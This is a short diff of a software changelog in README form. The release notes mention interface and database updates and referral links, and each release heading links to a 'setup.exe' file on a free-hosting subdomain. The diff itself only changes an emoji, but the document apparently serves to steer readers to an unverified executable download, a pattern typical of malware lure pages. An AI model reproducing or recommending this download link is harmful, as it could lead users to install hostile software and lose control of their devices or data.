@@ -9,7 +9,7 @@
 ##### -Updating the database
 ##### -Added a section for bloggers
 
-## 🔃 [Version - 7.8.2](http://s915550z.beget.tech/setup.exe)
+## 📥 [Version - 7.8.2](http://s915550z.beget.tech/setup.exe)
 ##### -Updating the interface
 ##### -Ability to invite partners via a referral link
 
